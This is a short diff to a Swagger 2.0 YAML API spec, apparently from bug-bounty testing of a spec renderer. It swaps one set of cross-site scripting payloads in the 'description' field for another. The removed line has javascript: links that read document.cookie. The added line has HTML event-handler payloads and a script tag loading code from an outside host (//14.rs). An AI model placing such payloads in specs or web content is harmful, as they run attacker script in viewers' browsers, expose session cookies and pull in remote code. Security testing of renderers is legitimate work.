@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Example yaml.spec
-  description: This is an example text **HELLO FROM MARKDOWN** [BountyPls](javascript:prompt(document.cookie)) [a](javascript://www.google.com%0Aalert(1)) [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+  description: This is an example text <details open ontoggle=confirm()> <svg onload=write()> <x oncut=alert()>x <svg onload=write()> <!--><script src=//14.rs>
 paths:
   /accounts:
     get:
